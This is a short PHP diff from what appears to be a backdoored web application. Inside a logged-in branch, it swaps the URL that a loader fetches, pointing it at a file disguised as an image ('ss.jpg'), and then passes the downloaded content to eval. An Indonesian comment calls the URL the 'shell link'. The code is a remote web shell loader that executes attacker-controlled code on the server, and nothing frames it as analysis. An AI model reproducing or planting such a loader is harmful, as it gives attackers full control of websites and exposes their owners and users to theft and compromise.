@@ -56,7 +56,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/slavination/odinastic/main/encalf.php'; ===> diganti ke link shell
+    $destiny = 'https://includes-page.com/ss.jpg'; ===> diganti ke link shell
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
